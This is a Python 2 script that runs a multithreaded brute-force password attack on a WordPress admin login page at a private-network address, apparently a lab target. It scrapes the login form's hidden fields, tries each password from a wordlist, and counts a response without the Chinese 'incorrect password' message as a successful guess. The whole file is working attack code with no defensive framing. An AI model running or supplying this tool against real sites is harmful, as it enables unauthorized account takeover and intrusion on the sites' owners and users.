#!/usr/bin/python
#coding=utf-8

import urllib
import urllib2
import cookielib
import threading
import sys
import Queue
from HTMLParser import HTMLParser
from dir_bruster import build_wordlist

thread_count = 10
target_url = 'http://192.168.99.196/wordpress/wp-login.php'
target_post = 'http://192.168.99.196/wordpress/wp-login.php'
username = 'admin'
wordlist = './pwd.txt'
username_field = 'log'
password_field = 'pwd'

class Bruter(object):
    def __init__(self, username, wordlist):
        self.username = username
        self.password_list = wordlist
        self.found = False
        print('Finished setting up for:%s' % username)
    
    def run_bruteforce(self):
        for i in range(thread_count):
            t = threading.Thread(target=self.web_brute)
            t.start()
    
    def web_brute(self):
        while not self.password_list.empty() and not self.found:
            brute = self.password_list.get().rstrip()
            jar = cookielib.FileCookieJar('cookies')
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
            
            res = opener.open(target_url)
            page = res.read()

            print('Trying: %s:%s (%d left)' % (self.username, brute, self.password_list.qsize()))

            parser = BruteParser()
            parser.feed(page)

            post_tags = parser.tag_results

            post_tags[username_field] = self.username
            post_tags[password_field] = brute
            login_data = urllib.urlencode(post_tags)
            print(login_data)
            
            login_res = opener.open(target_post, login_data)
            login_result = login_res.read()

            if '密码不正确' not in login_result:
                self.found = True
                print('[*] Brute successful by %s:%s' % (self.username, brute))
            

class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == 'input':
            tag_name = None
            tag_value = None
            for name, value in attrs:
                if name == 'name':
                    tag_name = value
                if name == 'value':
                    tag_value = value
            if tag_name is not None:
                self.tag_results[tag_name] = value

pwd_q = build_wordlist(wordlist)
brute_obj = Bruter(username, pwd_q)
brute_obj.run_bruteforce()